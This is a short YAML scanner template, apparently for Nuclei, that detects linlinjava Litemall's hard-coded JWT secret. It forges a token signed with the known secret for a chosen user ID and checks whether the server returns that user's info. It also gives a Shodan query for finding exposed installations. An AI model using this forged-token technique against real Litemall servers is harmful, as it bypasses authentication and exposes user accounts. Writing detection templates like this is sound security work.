http:
- headers:
    X-Litemall-Token: '{{ generate_jwt(payload, ''HS256'', secret) }}'
  matchers:
  - status:
    - 200
    type: status
  - condition: and
    type: word
    words:
    - '"errno": 0'
    - userInfo
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/wx/auth/info'
id: litemall-jwt
info:
  author: darses
  classification:
    cwe-id: CWE-798
  description: 'Detect linlinjava Litemall harcoded JWT secret.

    '
  metadata:
    max-requests: 1
    product: litemall
    shodan-query:
    - http.favicon.hash:1367958180
    vendor: linlinjava
    verified: false
  name: linlinjava Litemall - Hard-coded Credentials
  severity: high
  tags: linlinjava,litemall,oss,jwt
variables:
  payload: '{"sub":"this is litemall token", "aud":"MINIAPP", "iss":"LITEMALL", "exp":"{{unix_time(600)}}",
    "userId":{{ userid }}, "iat":"{{unix_time()}}"}'
  secret: X-Litemall-Token
  userid: 3
